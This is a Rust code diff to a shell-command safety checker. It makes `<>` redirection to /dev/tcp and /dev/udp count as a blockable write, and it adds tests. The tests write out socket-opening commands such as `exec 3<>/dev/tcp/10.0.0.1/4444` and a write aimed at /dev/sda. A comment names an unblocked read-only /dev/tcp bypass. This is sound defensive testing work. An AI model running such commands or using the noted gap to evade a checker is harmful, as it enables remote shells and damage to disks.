@@ -1618,7 +1618,14 @@ fn resolved_redirect_write_targets(redirections: &[Redirection]) -> Vec<String> 
 /// diverge on which redirect kinds count as a write.
 fn is_redirect_write_applicable(kind: &FileRedirectionKind, normalized: &[NormalizedWord]) -> bool {
     match kind {
-        FileRedirectionKind::Output | FileRedirectionKind::Append => true,
+        // Issue #425: `<>` opens its target for both reading and writing —
+        // treated as a genuine write here for the same reason `>`/`>>` are:
+        // opening `/dev/tcp/host/port` at all (regardless of which
+        // direction ends up used) is what establishes the connection, so
+        // the dangerous-target check must see it.
+        FileRedirectionKind::Output
+        | FileRedirectionKind::Append
+        | FileRedirectionKind::ReadAndWrite => true,
         // `<&` never writes its target the way `>&`/`>`/`>>` can — the
         // redirect rules this checks against are specifically about
         // overwriting a dangerous path, so a read-only duplication
@@ -13448,6 +13455,52 @@ mod tests {
         // genuine file write (`resolved_redirect_write_targets`'s own
         // fd-vs-path distinction, mirrored here for a substitution target).
         assert_decision("echo hi >&$(echo /dev/sda)", Decision::Block);
+    }
+
+    // ==== Issue #425: `<>` read-write redirection to /dev/tcp//dev/udp ====
+
+    #[test]
+    fn read_write_redirect_to_dev_tcp_blocks() {
+        assert_decision("exec 3<>/dev/tcp/10.0.0.1/4444", Decision::Block);
+    }
+
+    #[test]
+    fn read_write_redirect_to_dev_udp_blocks() {
+        assert_decision("exec 3<>/dev/udp/10.0.0.1/53", Decision::Block);
+    }
+
+    #[test]
+    fn read_write_redirect_to_dev_tcp_blocks_through_bash_dash_c() {
+        assert_decision(
+            "bash -c \"exec 3<>/dev/tcp/10.0.0.1/4444\"",
+            Decision::Block,
+        );
+    }
+
+    #[test]
+    fn plain_output_redirect_to_dev_tcp_also_blocks() {
+        // `normalized_prefix` matches by target path alone, not by
+        // redirection kind — a plain `>` also opens the pseudo-device and
+        // hits `is_redirect_write_applicable`'s existing `Output` arm.
+        assert_decision("exec 3>/dev/tcp/10.0.0.1/4444", Decision::Block);
+    }
+
+    #[test]
+    fn plain_input_redirect_to_dev_tcp_stays_allow() {
+        // Out of this issue's scope: `is_redirect_write_applicable`
+        // deliberately treats a read-only `<` as never worth a
+        // dangerous-target check (its own docs) — a genuine gap for the
+        // `cat </dev/tcp/host/port` connect-and-read shape, but a
+        // pre-existing one this issue's `<>` repro doesn't touch.
+        assert_decision("exec 3</dev/tcp/10.0.0.1/4444", Decision::Allow);
+    }
+
+    #[test]
+    fn read_write_redirect_to_an_ordinary_path_still_allows() {
+        // Regression guard: `<>` on a benign path used to reach `Ask` via
+        // the parse-failure fallback (issue #425's own repro); it must now
+        // be fully analyzed, not just newly Block-capable.
+        assert_decision("exec 3<>/tmp/somefile", Decision::Allow);
     }
 
     #[test]
